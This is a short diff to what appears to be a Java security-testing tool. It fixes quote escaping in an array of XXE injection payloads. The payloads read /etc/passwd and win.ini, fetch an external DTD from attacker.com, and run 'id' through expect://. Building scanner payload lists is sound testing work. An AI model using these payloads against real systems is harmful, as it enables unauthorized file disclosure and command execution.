@@ -292,7 +292,7 @@ String[] BUSINESS_LOGIC_PAYLOADS = {
 
 // XML/XXE Injection
 String[] XXE_PAYLOADS = {
-    "<?xml+version="1.0"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+"file:///etc/passwd">]><foo>%26xxe%3b</foo>",
+    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///etc/passwd\">]><foo>%26xxe%3b</foo>",
     "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///c:/windows/win.ini\">]>",
     "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+%+xxe+SYSTEM+\"http://attacker.com/evil.dtd\">%xxe;]>",
     "<!ENTITY+xxe+SYSTEM+\"expect://id\">",
